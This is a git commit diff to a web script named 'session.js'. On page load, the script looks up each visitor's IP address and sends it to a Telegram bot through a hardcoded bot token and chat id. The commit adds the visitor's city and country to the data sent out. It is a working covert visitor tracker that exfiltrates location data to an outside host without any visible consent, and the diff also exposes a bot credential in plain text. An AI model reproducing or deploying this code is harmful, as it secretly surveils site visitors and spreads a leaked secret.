27e7e61efbd7079b31d9ac28a72988fbafd92401
iDONi <30952073+Aidoni0797@users.noreply.github.com>
2025-01-22 22:07:33 +0500

    Update session.js

--- session.js
+++ session.js
@@ -4,7 +4,7 @@ window.onload = function() {
         .then(response => response.json())
         .then(data => {
             // Отправляем эти данные в бот или на сервер
-            fetch('https://api.telegram.org/bot8178967594:AAFos-m53_Q6f0mBoEdvVhq0FH5V4jUOkdM/sendMessage?chat_id=1163463444&text=<'+data.ip+'>', {  // Адрес для отправки данных в бота
+            fetch('https://api.telegram.org/bot8178967594:AAFos-m53_Q6f0mBoEdvVhq0FH5V4jUOkdM/sendMessage?chat_id=1163463444&text=<'+data.ip+' '+data.city+' '+data.country+'>', {  // Адрес для отправки данных в бота
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
